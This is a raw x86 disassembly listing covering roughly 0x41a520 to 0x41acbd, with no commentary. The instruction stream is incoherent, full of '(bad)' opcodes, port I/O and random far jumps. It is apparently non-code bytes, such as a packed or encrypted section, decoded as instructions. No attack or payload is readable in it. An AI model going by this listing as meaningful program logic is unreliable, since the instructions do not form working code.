  41a520:	push   ecx
  41a521:	jbe    0x41a500
  41a523:	xchg   ebx,eax
  41a524:	imul   eax,DWORD PTR [edx],0xff99c438
  41a52a:	dec    eax
  41a52b:	fwait
  41a52c:	mov    ds:0x29d33f2b,al
  41a531:	out    dx,al
  41a532:	xor    ah,cl
  41a534:	lods   al,BYTE PTR ds:[esi]
  41a535:	mov    cl,0x52
  41a537:	xrelease xchg DWORD PTR [edx+0x38],edi
  41a53b:	xchg   BYTE PTR [eax-0x52],al
  41a53e:	dec    esi
  41a53f:	mov    dl,0x46
  41a541:	repz in eax,0xaa
  41a544:	pop    ebp
  41a545:	inc    eax
  41a546:	iret   
  41a547:	std    
  41a548:	les    ebp,FWORD PTR [edi+eax*4-0x735e3cb1]
  41a54f:	xchg   edi,eax
  41a550:	or     bh,BYTE PTR [edx-0x168aecb0]
  41a556:	xchg   esi,eax
  41a557:	sbb    DWORD PTR [ebx-0xa25427c],ebx
  41a55d:	mov    es,edx
  41a55f:	rol    DWORD PTR [ecx+0x4d231cf9],cl
  41a565:	jp     0x41a59c
  41a567:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a568:	jo     0x41a572
  41a56a:	mov    dl,0xf5
  41a56c:	or     DWORD PTR [ebp-0x29c4f3a4],0xd9e70f18
  41a576:	mov    dl,0x42
  41a578:	into   
  41a579:	jb     0x41a5c4
  41a57b:	addr16 pushaw 
  41a57e:	xor    dl,ch
  41a580:	mov    WORD PTR [edx+ebx*4],cs
  41a583:	push   ecx
  41a584:	push   ebx
  41a585:	in     al,0xca
  41a587:	mov    dh,0x3b
  41a589:	ds push ss
  41a58b:	and    DWORD PTR [esi+0x206eb425],0x0
  41a592:	lahf   
  41a593:	mov    ds,ebp
  41a595:	sbb    DWORD PTR [eax+0x17e2d080],0x2d
  41a59c:	vcmppd ymm4,ymm0,ymm4,0x93
  41a5a1:	in     al,dx
  41a5a2:	call   0xedb86140
  41a5a7:	leave  
  41a5a8:	and    DWORD PTR [edx+0x5c669438],ecx
  41a5ae:	push   ecx
  41a5af:	lock xor bh,dh
  41a5b2:	std    
  41a5b3:	lahf   
  41a5b4:	xor    esi,DWORD PTR [esi-0x68]
  41a5b7:	adc    al,0x24
  41a5b9:	mov    edi,0x1d418130
  41a5be:	out    0xcf,eax
  41a5c0:	jmp    0x41a574
  41a5c2:	fild   QWORD PTR [ecx]
  41a5c4:	jo     0x41a580
  41a5c6:	add    BYTE PTR [ebx],dl
  41a5c8:	add    DWORD PTR [ebx+0x10edf75e],ecx
  41a5ce:	hlt    
  41a5cf:	(bad)  
  41a5d0:	out    0x4f,eax
  41a5d2:	aaa    
  41a5d3:	and    ch,BYTE PTR [eax-0x1b2f6a28]
  41a5d9:	cli    
  41a5da:	mov    eax,esp
  41a5dc:	scas   al,BYTE PTR es:[edi]
  41a5dd:	retf   
  41a5de:	dec    edi
  41a5df:	xor    esp,ebx
  41a5e1:	sar    BYTE PTR [edi-0x3ea126c1],cl
  41a5e7:	(bad)  
  41a5e8:	iret   
  41a5e9:	sub    edx,0xffffff86
  41a5ec:	loope  0x41a578
  41a5ee:	add    eax,0xa213ea0e
  41a5f3:	fwait
  41a5f4:	push   cs
  41a5f5:	mov    ah,0x8
  41a5f7:	or     BYTE PTR [edx],bl
  41a5f9:	add    eax,0x9aeb05f1
  41a5fe:	push   0xeaf8551a
  41a603:	push   ecx
  41a604:	clc    
  41a605:	scas   al,BYTE PTR es:[edi]
  41a606:	xor    ebp,ebp
  41a608:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a609:	or     dl,BYTE PTR [edi+0x63]
  41a60c:	aam    0xb4
  41a60e:	out    dx,al
  41a60f:	test   BYTE PTR [ebp+ecx*2+0x3d21627],bl
  41a616:	popf   
  41a617:	mov    ebp,DWORD PTR [edi-0x7]
  41a61a:	fwait
  41a61b:	add    edx,DWORD PTR [ebx-0x10]
  41a61e:	push   cs
  41a61f:	popa   
  41a620:	ss jb  0x41a611
  41a623:	(bad)
  41a626:	fwait
  41a627:	(bad)  
  41a628:	lea    edi,[edx+0x619ca342]
  41a62e:	cmp    edx,ebx
  41a630:	mov    dh,BYTE PTR [edi+0x3bfd1ac5]
  41a636:	call   0xa857:0x8fb1d713
  41a63d:	aad    0x9f
  41a63f:	shl    BYTE PTR [ecx+edi*8-0x5627c1e],cl
  41a646:	inc    ecx
  41a647:	stos   DWORD PTR es:[edi],eax
  41a648:	or     BYTE PTR [ebx+0xd],bl
  41a64b:	lahf   
  41a64c:	in     al,dx
  41a64d:	mov    BYTE PTR [edi],dh
  41a64f:	inc    ebx
  41a650:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  41a652:	sbb    ebp,eax
  41a654:	pop    ss
  41a655:	mov    eax,0x5f370252
  41a65a:	pop    esi
  41a65b:	jo     0x41a611
  41a65d:	and    al,0xb0
  41a65f:	push   cs
  41a660:	in     al,dx
  41a661:	int3   
  41a662:	mov    eax,ebx
  41a664:	ror    al,cl
  41a666:	inc    esi
  41a667:	mov    al,ds:0x8a5e2b75
  41a66c:	jg     0x41a5ff
  41a66e:	stos   DWORD PTR es:[edi],eax
  41a66f:	rol    BYTE PTR [edx+0x7],1
  41a672:	sbb    cl,0xab
  41a675:	sbb    BYTE PTR [ebp+0x4],cl
  41a678:	rol    DWORD PTR [esi-0x5a],0x31
  41a67c:	jmp    0x41a6ba
  41a67e:	fisttp DWORD PTR [edi-0x20]
  41a681:	ja     0x41a656
  41a683:	(bad)  
  41a684:	cmc    
  41a685:	sbb    bl,bl
  41a687:	repz std 
  41a689:	and    ch,BYTE PTR [eax+esi*1-0x18]
  41a68d:	pusha  
  41a68e:	push   ecx
  41a68f:	adc    BYTE PTR [esi+0x6a],0xac
  41a693:	ds call 0x1cc:0xa637bf11
  41a69b:	xchg   ebp,eax
  41a69c:	js     0x41a707
  41a69e:	sbb    eax,0x54807ef2
  41a6a3:	mov    eax,ds:0x7af83a97
  41a6a8:	data16 and dl,BYTE PTR [esi-0x33]
  41a6ac:	push   ebx
  41a6ad:	imul   esp,ebx,0x44beb2db
  41a6b3:	xlat   BYTE PTR ds:[ebx]
  41a6b4:	stos   BYTE PTR es:[edi],al
  41a6b5:	push   eax
  41a6b6:	adc    eax,0xcc2750ba
  41a6bb:	sub    BYTE PTR [edi],bl
  41a6bd:	bound  esp,QWORD PTR [ebx+0x3451ffbe]
  41a6c3:	pop    esi
  41a6c4:	sar    esp,0x6c
  41a6c7:	mov    DWORD PTR [eax],esp
  41a6c9:	jp     0x41a65a
  41a6cb:	loope  0x41a6a0
  41a6cd:	cmp    esp,DWORD PTR [ebp+0x79]
  41a6d0:	ficom  DWORD PTR [ebx-0x2e]
  41a6d3:	sti    
  41a6d4:	call   0x44e309a9
  41a6d9:	inc    eax
  41a6da:	inc    edx
  41a6db:	lods   eax,DWORD PTR ds:[esi]
  41a6dc:	loope  0x41a6fe
  41a6de:	outs   dx,BYTE PTR ds:[esi]
  41a6df:	mov    ebp,DWORD PTR [ecx]
  41a6e1:	mov    edx,0x6a9bf141
  41a6e6:	push   ecx
  41a6e7:	psllw  mm2,QWORD PTR [ebp-0x3747a8c7]
  41a6ee:	sar    BYTE PTR [ebx],0x88
  41a6f1:	mov    ecx,edi
  41a6f3:	ja     0x41a69a
  41a6f5:	and    al,0xa1
  41a6f7:	mov    dl,0x64
  41a6f9:	mov    edx,0xbc2fba50
  41a6fe:	sbb    eax,0x92b0b01c
  41a703:	retf   0xcbe2
  41a706:	inc    eax
  41a707:	xor    eax,0x146c386f
  41a70c:	aas    
  41a70d:	mov    ds:0x60e33c79,eax
  41a712:	iret   
  41a713:	and    ebp,eax
  41a715:	aam    0xd9
  41a717:	cmp    bh,BYTE PTR [ebx+0x6a9732a9]
  41a71d:	(bad)
  41a720:	and    esi,edi
  41a722:	mov    ss,WORD PTR [ebp-0x7523a01a]
  41a728:	fsubr  QWORD PTR [ecx+0x35]
  41a72b:	(bad)  
  41a72c:	icebp  
  41a72d:	xchg   BYTE PTR [ebp+0xb],dh
  41a730:	xchg   edx,ebp
  41a732:	icebp  
  41a733:	int3   
  41a734:	(bad)
  41a739:	das    
  41a73a:	out    0xd1,eax
  41a73c:	push   0xffffff90
  41a73e:	mov    ds:0x5b918dc0,eax
  41a743:	(bad)  
  41a745:	outs   dx,BYTE PTR ds:[esi]
  41a746:	(bad)  
  41a747:	lods   al,BYTE PTR ds:[esi]
  41a748:	mov    esp,DWORD PTR [ecx+ecx*4+0x2a]
  41a74c:	pop    ebp
  41a74d:	xchg   esp,eax
  41a74e:	mov    al,ds:0x33d6afe1
  41a753:	push   esp
  41a754:	outs   dx,BYTE PTR ds:[esi]
  41a755:	cmp    al,0xcb
  41a757:	mov    fs,ecx
  41a759:	test   eax,0xfc5494c8
  41a75e:	in     al,dx
  41a75f:	mov    cs,WORD PTR [esi+0x52]
  41a762:	pop    ss
  41a763:	sub    eax,0x116f4275
  41a768:	lods   al,BYTE PTR ds:[esi]
  41a769:	pop    esi
  41a76a:	pop    ebx
  41a76b:	mov    eax,0x9679b954
  41a770:	test   DWORD PTR [ecx-0x20f702c7],edi
  41a776:	test   eax,0x34d581a2
  41a77b:	mov    ebp,0x19ef26
  41a780:	pop    esp
  41a781:	adc    eax,0x381d7bc6
  41a786:	xchg   BYTE PTR [edx],dl
  41a788:	sbb    DWORD PTR [edi],ebx
  41a78a:	or     eax,0x7fe73dc
  41a78f:	(bad)
  41a794:	cmp    al,0x83
  41a796:	mov    ebp,0x904a95d1
  41a79b:	lds    ebp,FWORD PTR [ecx+0x7ee326ce]
  41a7a1:	push   cs
  41a7a2:	or     al,0x5b
  41a7a4:	repnz sbb edi,DWORD PTR [eax+0x2a]
  41a7a8:	fidiv  WORD PTR [edx-0x1c3d648]
  41a7ae:	push   ds
  41a7af:	(bad)  
  41a7b0:	loop   0x41a768
  41a7b2:	call   0xf5ed3173
  41a7b7:	ss adc eax,0x3a8855c1
  41a7bd:	adc    bl,BYTE PTR [esi-0x49]
  41a7c0:	imul   ecx,esp,0xf0787734
  41a7c6:	xchg   esi,eax
  41a7c7:	(bad)  
  41a7c8:	and    eax,0xf3c2f6fc
  41a7cd:	inc    ebp
  41a7ce:	loopne 0x41a7c5
  41a7d0:	push   eax
  41a7d1:	sbb    al,0xf9
  41a7d3:	or     DWORD PTR [ecx+0x71c6b264],0x72c04b6c
  41a7dd:	mov    ecx,0x4449f879
  41a7e2:	inc    esp
  41a7e3:	mov    esp,0x1673fbe
  41a7e8:	push   eax
  41a7e9:	mov    ah,0x6
  41a7eb:	jmp    0x557d:0x8d7573c8
  41a7f2:	scas   eax,DWORD PTR es:[edi]
  41a7f3:	dec    ebp
  41a7f4:	dec    esi
  41a7f5:	stc    
  41a7f6:	add    al,0xb
  41a7f8:	fwait
  41a7f9:	shr    ebp,1
  41a7fb:	inc    ebp
  41a7fc:	iret   
  41a7fd:	inc    edx
  41a7fe:	mov    esi,0x1db6781e
  41a803:	and    eax,0xedc0dd9e
  41a808:	mov    al,ds:0xa21be50e
  41a80d:	test   cl,bh
  41a80f:	mov    ds:0x4d27798b,al
  41a814:	inc    esp
  41a815:	pop    ebx
  41a816:	pop    ss
  41a817:	inc    edx
  41a818:	sahf   
  41a819:	mov    eax,0x7b560afa
  41a81e:	push   ds
  41a81f:	ja     0x41a849
  41a821:	and    bh,BYTE PTR [edi]
  41a823:	cmp    eax,0x6faf2c16
  41a828:	inc    eax
  41a829:	adc    DWORD PTR [ebx+0x49ea5095],edi
  41a82f:	xor    ebx,DWORD PTR [ecx+edi*2-0x7dee7c60]
  41a836:	inc    eax
  41a837:	push   ss
  41a838:	call   0x5c5eda1b
  41a83d:	in     al,0xfd
  41a83f:	fadd   QWORD PTR [ebp-0x641db358]
  41a845:	aad    0xc3
  41a847:	addr16 aam 0xde
  41a84a:	sub    al,0xad
  41a84c:	ja     0x41a82b
  41a84e:	shl    BYTE PTR [ebx+0x40d8c7fd],0xd2
  41a855:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a856:	pop    edi
  41a857:	mov    ebx,DWORD PTR [edx+0x732d7d8b]
  41a85d:	iret   
  41a85e:	push   edx
  41a85f:	fisub  WORD PTR [eax+0x2e]
  41a862:	into   
  41a863:	dec    esi
  41a864:	out    0xdd,eax
  41a866:	sbb    edi,eax
  41a868:	ja     0x41a8bd
  41a86a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a86b:	adc    edi,ecx
  41a86d:	sbb    DWORD PTR ds:0x1d33d65b,eax
  41a873:	dec    esi
  41a874:	int    0xc0
  41a876:	pop    ebp
  41a877:	outs   dx,DWORD PTR ds:[esi]
  41a878:	call   DWORD PTR [ebx-0x78]
  41a87b:	clc    
  41a87c:	and    al,0x5a
  41a87e:	xor    al,BYTE PTR [ebx+0x3b3117f5]
  41a884:	xor    ebx,DWORD PTR [edx+0x5b0d52ab]
  41a88a:	jmp    0x1861de7e
  41a88f:	dec    edx
  41a890:	into   
  41a891:	pop    eax
  41a892:	dec    edi
  41a893:	outs   dx,BYTE PTR ds:[esi]
  41a894:	xor    BYTE PTR [eax-0x1b],0x1b
  41a898:	pmuludq mm6,QWORD PTR [ecx]
  41a89b:	(bad)  
  41a89c:	loope  0x41a893
  41a89e:	mov    eax,ds:0x97782bcf
  41a8a3:	std    
  41a8a4:	mov    ds:0xa6eb0195,eax
  41a8a9:	es push cs
  41a8ab:	sub    al,0x93
  41a8ad:	and    eax,0x9609f188
  41a8b2:	mov    bl,BYTE PTR [edi+0x1]
  41a8b5:	pop    esp
  41a8b6:	mov    edi,DWORD PTR [edi+esi*1+0x15]
  41a8ba:	xchg   ebx,eax
  41a8bb:	out    0xe5,eax
  41a8bd:	jnp    0x41a91a
  41a8bf:	call   0xa3f9:0xbb4cce0f
  41a8c6:	dec    ebp
  41a8c7:	cmp    ebx,edx
  41a8c9:	ret    
  41a8ca:	(bad)  
  41a8cb:	mov    edx,0x13d45ab2
  41a8d0:	jge    0x41a8c3
  41a8d2:	sub    ch,BYTE PTR [edx+0x327a2d5c]
  41a8d8:	push   esi
  41a8d9:	ins    DWORD PTR es:[edi],dx
  41a8da:	inc    ebp
  41a8db:	mov    eax,0x54723261
  41a8e0:	fbstp  TBYTE PTR [edx]
  41a8e2:	clc    
  41a8e3:	je     0x41a961
  41a8e5:	call   0xec0769c5
  41a8ea:	jb     0x41a919
  41a8ec:	pop    ecx
  41a8ed:	xchg   ecx,eax
  41a8ee:	shl    ah,0x7d
  41a8f1:	retf   
  41a8f2:	jb     0x41a8ca
  41a8f4:	aad    0x9f
  41a8f6:	sbb    DWORD PTR [ebx+0x26],edi
  41a8f9:	cdq    
  41a8fa:	xchg   ebx,eax
  41a8fb:	in     eax,dx
  41a8fc:	hlt    
  41a8fd:	jle    0x41a918
  41a8ff:	(bad)  
  41a901:	mov    bh,0x93
  41a903:	mov    cl,BYTE PTR [eax+eiz*8]
  41a906:	clc    
  41a907:	hlt    
  41a908:	test   BYTE PTR [ebx+esi*8-0x66],cl
  41a90c:	cli    
  41a90d:	jecxz  0x41a8d6
  41a90f:	jo     0x41a986
  41a911:	fld    DWORD PTR [ebp+0x51]
  41a914:	cmp    DWORD PTR [eax-0x106b805b],0xfffffff0
  41a91b:	repz iret 
  41a91d:	sar    DWORD PTR [eax],1
  41a91f:	sbb    DWORD PTR [edx-0x46b9625f],0x59d990f6
  41a929:	enter  0x2cd0,0x68
  41a92d:	inc    ebx
  41a92e:	jns    0x41a8cc
  41a930:	dec    eax
  41a931:	cmp    BYTE PTR [esi-0x50],ah
  41a934:	cld    
  41a935:	and    cl,BYTE PTR [ebx+0x65ea7576]
  41a93b:	push   cs
  41a93c:	sahf   
  41a93d:	jmp    0xaa7d:0xd332782a
  41a944:	pop    ebx
  41a945:	sub    BYTE PTR [ebx+esi*2+0x3ee4f526],dh
  41a94c:	jge    0x41a9c5
  41a94e:	sub    bh,BYTE PTR [esi-0x34]
  41a951:	scas   eax,DWORD PTR es:[edi]
  41a952:	inc    ebp
  41a953:	mov    ebx,0x961fb520
  41a958:	fcom   QWORD PTR [eax+0x3a]
  41a95b:	jmp    0xbd93:0x210bc07
  41a962:	jne    0x41a8e5
  41a964:	sahf   
  41a965:	outs   dx,DWORD PTR ds:[esi]
  41a966:	ficom  WORD PTR [ebx+0x30]
  41a969:	hlt    
  41a96a:	mov    eax,0x8f2f9b66
  41a96f:	jb     0x41a9ef
  41a971:	xchg   esp,ebp
  41a973:	sub    cl,ch
  41a975:	sbb    esp,DWORD PTR [ebx-0x7cc75832]
  41a97b:	outs   dx,DWORD PTR ds:[esi]
  41a97c:	out    dx,eax
  41a97d:	mov    BYTE PTR [ebp+0xb],bh
  41a980:	pushf  
  41a981:	cmp    ch,BYTE PTR [eax]
  41a983:	fistp  QWORD PTR [ebp+esi*8-0x6ac3559]
  41a98a:	inc    ebx
  41a98b:	enter  0x9630,0x45
  41a98f:	cmp    al,0x56
  41a991:	xchg   esp,eax
  41a992:	mov    bh,0x25
  41a994:	fwait
  41a995:	repnz cmp DWORD PTR [ebp-0x16],ecx
  41a999:	shl    DWORD PTR [eax-0x12],0xf8
  41a99d:	inc    esp
  41a99e:	jecxz  0x41a9e1
  41a9a0:	lea    ecx,[esi]
  41a9a2:	sbb    eax,0x4875133f
  41a9a7:	pop    ds
  41a9a8:	or     eax,0x7a260499
  41a9ad:	pop    ebp
  41a9ae:	jmp    0x9321ea5d
  41a9b3:	inc    edx
  41a9b4:	xor    esp,esi
  41a9b6:	jb     0x41a991
  41a9b8:	push   esi
  41a9b9:	push   ecx
  41a9ba:	js     0x41aa2d
  41a9bc:	ficom  DWORD PTR [edx+0x22]
  41a9bf:	sahf   
  41a9c0:	mov    ds:0x3f05b20c,eax
  41a9c5:	pop    ss
  41a9c6:	inc    ebp
  41a9c7:	imul   esi,DWORD PTR [ecx-0x54a5d5be],0x3b110d9b
  41a9d1:	dec    esi
  41a9d2:	clc    
  41a9d3:	dec    eax
  41a9d4:	mov    ecx,DWORD PTR [ecx-0x11]
  41a9d7:	jae    0x41a983
  41a9d9:	dec    edi
  41a9da:	loope  0x41aa52
  41a9dc:	test   eax,0x73516a2c
  41a9e1:	les    ebp,FWORD PTR [edx]
  41a9e3:	sub    dh,bl
  41a9e5:	loop   0x41aa09
  41a9e7:	imul   ebp,DWORD PTR [edx-0x70df8212],0x6c
  41a9ee:	out    dx,al
  41a9ef:	fldcw  WORD PTR [ebx-0x9]
  41a9f2:	push   ebp
  41a9f3:	nop
  41a9f4:	repz sub BYTE PTR [edx],ah
  41a9f7:	sahf   
  41a9f8:	mov    edx,0xca36f625
  41a9fd:	dec    esp
  41a9fe:	push   ebx
  41a9ff:	xor    ch,BYTE PTR es:[edx+ecx*2]
  41aa03:	push   edx
  41aa04:	mov    ebx,DWORD PTR [edi+0x67]
  41aa07:	dec    eax
  41aa08:	jge    0x41aa26
  41aa0a:	push   edx
  41aa0b:	push   es
  41aa0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aa0d:	pop    eax
  41aa0e:	jmp    0x495b:0x4113023
  41aa15:	cwde   
  41aa16:	sub    eax,0x7bd698b0
  41aa1b:	lahf   
  41aa1c:	cwde   
  41aa1d:	push   es
  41aa1e:	sbb    eax,0x71054abf
  41aa23:	xchg   esp,eax
  41aa24:	out    dx,al
  41aa25:	mov    dl,0x4f
  41aa27:	test   ah,bl
  41aa29:	(bad)  
  41aa2a:	jmp    0xf7b442f0
  41aa2f:	stos   BYTE PTR es:[edi],al
  41aa30:	lds    ecx,FWORD PTR [eax]
  41aa32:	mov    eax,ds:0x334911d4
  41aa37:	adc    DWORD PTR [ecx],edi
  41aa39:	in     al,0x6e
  41aa3b:	inc    edx
  41aa3c:	or     eax,0x57f0039f
  41aa41:	cmp    eax,0x16711c2e
  41aa46:	rcl    edx,cl
  41aa48:	jo     0x41aa80
  41aa4a:	sbb    eax,0x46407333
  41aa4f:	mov    ds:0xca2d085,al
  41aa54:	mov    ecx,0x6fc824da
  41aa59:	sti    
  41aa5a:	pop    edi
  41aa5b:	addr16 pop ss
  41aa5d:	inc    eax
  41aa5e:	sub    bl,BYTE PTR [esi+0x71]
  41aa61:	adc    ebp,DWORD PTR [edi]
  41aa63:	xchg   edi,eax
  41aa64:	push   ecx
  41aa65:	into   
  41aa66:	sbb    BYTE PTR [edx],dl
  41aa68:	cld    
  41aa69:	jmp    0x39ef4ed
  41aa6e:	inc    edx
  41aa6f:	aam    0xa8
  41aa71:	repz cwde 
  41aa73:	lods   al,BYTE PTR ds:[esi]
  41aa74:	adc    al,cl
  41aa76:	sbb    al,BYTE PTR [edi]
  41aa78:	js     0x41aa15
  41aa7a:	cwde   
  41aa7b:	daa    
  41aa7c:	mov    esi,0x49bddd57
  41aa81:	mov    ah,0xf2
  41aa83:	aam    0x79
  41aa85:	out    0x5c,eax
  41aa87:	xor    DWORD PTR [esp+ecx*2-0x4fc9714d],esp
  41aa8e:	mov    edi,?
  41aa90:	popf   
  41aa91:	mov    DWORD PTR [esp+ebx*1-0x54],esp
  41aa95:	adc    BYTE PTR [edi],dh
  41aa97:	std    
  41aa98:	or     BYTE PTR [edi-0x2329779d],dl
  41aa9e:	xchg   BYTE PTR [esi-0x6fd37f2b],cl
  41aaa4:	push   esp
  41aaa5:	adc    ch,0x17
  41aaa8:	loop   0x41ab06
  41aaaa:	sbb    cl,BYTE PTR [edx-0x7b260757]
  41aab0:	(bad)  
  41aab1:	scas   eax,DWORD PTR es:[edi]
  41aab2:	xor    DWORD PTR [eax-0x60],ebx
  41aab5:	inc    esp
  41aab6:	stc    
  41aab7:	sbb    al,0x40
  41aab9:	stos   DWORD PTR es:[edi],eax
  41aaba:	xchg   esp,eax
  41aabb:	lock shl BYTE PTR [ebp+0x5d3b2036],0x2a
  41aac3:	in     eax,dx
  41aac4:	imul   ebx,DWORD PTR [esi-0x2b],0x137e3cec
  41aacb:	not    cl
  41aacd:	jg     0x41ab09
  41aacf:	mov    dl,0xb7
  41aad1:	add    al,0xfe
  41aad3:	mov    dh,0xea
  41aad5:	mov    edi,0xa3407254
  41aada:	es mov esp,0x8cb04216
  41aae0:	mov    al,ds:0xaf771bb0
  41aae5:	inc    esp
  41aae6:	jmp    0xa57b66df
  41aaeb:	iret   
  41aaec:	or     esi,DWORD PTR [esi+0x64]
  41aaef:	jae    0x41aae3
  41aaf1:	lea    edi,[edi+edi*2]
  41aaf4:	imul   ebx,ebx,0x4005d237
  41aafa:	in     al,0xe3
  41aafc:	add    al,0x2f
  41aafe:	jnp    0x41ab7e
  41ab00:	aaa    
  41ab01:	mov    al,ds:0xb2fa166b
  41ab06:	fadd   DWORD PTR [ebp-0x202a0d44]
  41ab0c:	pop    ebx
  41ab0d:	mov    bh,0x33
  41ab0f:	pop    ss
  41ab10:	xchg   ebp,eax
  41ab11:	and    al,0x1b
  41ab13:	add    al,0xf5
  41ab15:	pop    esp
  41ab16:	and    ah,bl
  41ab18:	mov    ch,0x25
  41ab1a:	outs   dx,BYTE PTR ds:[esi]
  41ab1b:	push   0xf2f5aa53
  41ab20:	mov    ebx,0xb9ca5c7b
  41ab25:	sub    al,0xd2
  41ab27:	adc    eax,0xe45cb02a
  41ab2c:	hlt    
  41ab2d:	cmc    
  41ab2e:	and    BYTE PTR [eax-0x6f0d9115],cl
  41ab34:	add    BYTE PTR [esi+0x733ddd72],ch
  41ab3a:	push   ds
  41ab3b:	call   0xb2ad44b4
  41ab40:	adc    eax,0xf0d308a9
  41ab45:	xchg   BYTE PTR [edi],al
  41ab47:	pop    edi
  41ab48:	repz ficomp DWORD PTR [edi]
  41ab4b:	adc    eax,0xfdcbe2d0
  41ab50:	mov    edx,cs
  41ab52:	mov    bl,0x9e
  41ab54:	xor    BYTE PTR [eax+edi*4+0x8],bh
  41ab58:	jg     0x41ab1c
  41ab5a:	aam    0xc1
  41ab5c:	mov    esi,DWORD PTR [edi-0x10]
  41ab5f:	iret   
  41ab60:	data16 fbld TBYTE PTR [ebx+0x380eba09]
  41ab67:	mov    ch,0x42
  41ab69:	xchg   edi,eax
  41ab6a:	pop    esp
  41ab6b:	adc    edx,esp
  41ab6d:	sar    ebp,cl
  41ab6f:	xchg   ebx,eax
  41ab70:	push   ebp
  41ab71:	xor    edx,DWORD PTR [esi-0x3df09609]
  41ab77:	lea    eax,ds:0x618eb3fd
  41ab7d:	jno    0x41abed
  41ab7f:	adc    ch,bh
  41ab81:	fs fnclex 
  41ab84:	dec    esi
  41ab85:	adc    dh,ah
  41ab87:	dec    esp
  41ab88:	retf   0x4500
  41ab8b:	rol    BYTE PTR [esp+eax*1],1
  41ab8e:	jbe    0x41ab5f
  41ab90:	lods   eax,DWORD PTR ds:[esi]
  41ab91:	fld    QWORD PTR [ebx-0x7761cd18]
  41ab97:	enter  0x6157,0x39
  41ab9b:	fwait
  41ab9c:	les    esp,FWORD PTR [edi]
  41ab9e:	addr16 or eax,0xea7fe9fe
  41aba4:	adc    al,0x13
  41aba6:	dec    edx
  41aba7:	mov    ds:0x993db209,al
  41abad:	outs   dx,BYTE PTR ds:[esi]
  41abae:	lahf   
  41abaf:	sahf   
  41abb0:	mov    BYTE PTR [ecx-0x7457727a],bl
  41abb6:	xchg   ecx,eax
  41abb7:	ss std 
  41abb9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41abba:	and    esp,DWORD PTR [ecx-0x6f]
  41abbd:	lods   eax,DWORD PTR ds:[esi]
  41abbe:	loope  0x41abce
  41abc0:	pop    es
  41abc1:	push   es
  41abc2:	jb     0x41ab6d
  41abc4:	in     eax,dx
  41abc5:	mov    ds:0xcd3fcd9f,al
  41abca:	xlat   BYTE PTR ds:[ebx]
  41abcb:	jmp    DWORD PTR [ecx+ecx*4]
  41abce:	mov    eax,ds:0xac718c98
  41abd3:	adc    bl,BYTE PTR [edi]
  41abd5:	stc    
  41abd6:	push   eax
  41abd7:	outs   dx,DWORD PTR ds:[esi]
  41abd8:	icebp  
  41abd9:	jo     0x41ac0f
  41abdb:	icebp  
  41abdc:	scas   al,BYTE PTR es:[edi]
  41abdd:	pop    edx
  41abde:	and    al,0x3e
  41abe0:	cld    
  41abe1:	mov    ds:0x66363dfb,al
  41abe6:	jl     0x41abda
  41abe8:	(bad)  
  41abea:	sub    BYTE PTR [ebp-0x60],dl
  41abed:	adc    DWORD PTR [eax],ebx
  41abef:	cmp    eax,0x1fbde887
  41abf4:	lock sbb ebp,DWORD PTR [esp+eax*8-0x64]
  41abf9:	sub    ah,BYTE PTR [eax]
  41abfb:	xor    ebx,DWORD PTR [esi-0x5919aa4d]
  41ac01:	sbb    cl,BYTE PTR [edi]
  41ac03:	fidivr DWORD PTR [ecx+0x1940ebdf]
  41ac09:	mov    ds:0x8bd2b3c,al
  41ac0e:	mov    al,ds:0x8d91ff38
  41ac13:	nop
  41ac14:	adc    dh,0xba
  41ac17:	push   ss
  41ac18:	xlat   BYTE PTR ds:[ebx]
  41ac19:	push   esp
  41ac1a:	ret    
  41ac1b:	aas    
  41ac1c:	enter  0x994b,0x27
  41ac20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ac21:	sub    al,0x7d
  41ac23:	dec    edx
  41ac25:	lods   al,BYTE PTR ds:[esi]
  41ac26:	out    dx,al
  41ac27:	mov    al,0x9f
  41ac29:	leave  
  41ac2a:	xchg   ecx,eax
  41ac2b:	mov    ds:0xe814ccc5,eax
  41ac30:	xchg   ebx,eax
  41ac31:	mov    ebp,0xd99d11c0
  41ac36:	mov    ebx,0x67ca3cd9
  41ac3b:	inc    ebp
  41ac3c:	cmp    edx,ebx
  41ac3e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ac3f:	push   ebx
  41ac40:	bswap  ebp
  41ac42:	fld    QWORD PTR [esi]
  41ac44:	leave  
  41ac45:	xchg   esp,eax
  41ac46:	push   ecx
  41ac47:	jnp    0x41ac5b
  41ac49:	xor    ebx,DWORD PTR [eax-0x76]
  41ac4c:	repnz in al,dx
  41ac4e:	mov    ecx,0x249e9bc1
  41ac53:	ret    
  41ac54:	mov    cl,0x5f
  41ac56:	push   esi
  41ac57:	mov    eax,ds:0x74cdcb17
  41ac5c:	mov    eax,ds:0xfc01b55c
  41ac61:	pop    edi
  41ac62:	adc    BYTE PTR [esi+0x25],dh
  41ac65:	jne    0x41abfb
  41ac67:	xchg   esi,eax
  41ac68:	mov    bl,0x84
  41ac6a:	rcl    DWORD PTR [edx],cl
  41ac6c:	and    ch,bl
  41ac6e:	lods   al,BYTE PTR ds:[esi]
  41ac6f:	ret    0xddb0
  41ac72:	xor    BYTE PTR [esi-0x59],0x9a
  41ac76:	out    dx,al
  41ac77:	or     BYTE PTR [ecx],0x4f
  41ac7a:	fnstsw WORD PTR [edi-0x55595c44]
  41ac80:	mov    cl,0xa5
  41ac82:	adc    eax,0x83110d66
  41ac87:	jmp    0xbd8c:0x262e9c13
  41ac8e:	jae    0x41ac40
  41ac90:	test   DWORD PTR [edi+0x2588de47],0x65cfc84e
  41ac9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ac9b:	ret    
  41ac9c:	daa    
  41ac9d:	and    edx,DWORD PTR [eax]
  41ac9f:	xor    DWORD PTR [ebx+eiz*4],0xffffffe0
  41aca3:	data16 mov ah,0xd6
  41aca6:	loope  0x41ac57
  41aca8:	mov    DWORD PTR [eax+0x631be61b],eax
  41acae:	fmul   QWORD PTR [eax+eiz*8]
  41acb1:	add    bl,BYTE PTR [eax-0x55337d72]
  41acb7:	fldcw  WORD PTR [edx-0x40]
  41acba:	and    DWORD PTR [ecx-0x33],ebx
  41acbd:	sti    
